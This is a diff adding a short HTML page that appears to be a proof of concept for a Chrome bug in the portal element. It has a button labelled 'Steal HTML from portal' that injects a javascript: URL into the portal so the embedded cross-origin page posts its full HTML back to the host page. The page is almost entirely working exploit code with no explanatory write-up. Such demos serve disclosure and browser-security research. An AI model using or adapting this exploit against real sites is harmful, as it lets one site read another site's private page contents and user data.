@@ -1,0 +1,46 @@
+<!doctype html><meta charset=utf-8>
+<style>
+iframe, portal {
+	width: 350px;
+	height: 150px;
+	border: 3px inset;
+}	
+input {
+	width: 500px;
+}
+div {
+	display: inline-block;
+}
+</style>
+
+Address: 
+<form autocomplete=off action=javascript:openUrl(url.value)>
+	<input id=url name=url><br>
+	<button>Open the address in iframe and portal</button>
+</form> 
+<button onclick=portal.activate()>portal.activate()</button><br>
+<button onclick=exploit()>Steal HTML from portal (Chrome bug)</button><br><br>
+<div>&lt;iframe>:<br><iframe></iframe></div>
+<div>&lt;portal>:<br><portal></portal></div>
+<script>
+	const portal = document.querySelector('portal');
+	const iframe = document.querySelector('iframe');
+	
+	portal.onload = () => console.log('portal onload');
+	
+	function openUrl(url) {		
+		portal.src = url;
+		iframe.src = url;
+		
+	}
+	
+	portal.onmessage = ev => {
+		alert(ev.data);
+	}
+	function exploit() {
+		portal.src = `javascript:portalHost.postMessage(document.documentElement.outerHTML, '*')`;
+		
+	}
+	
+	
+</script>
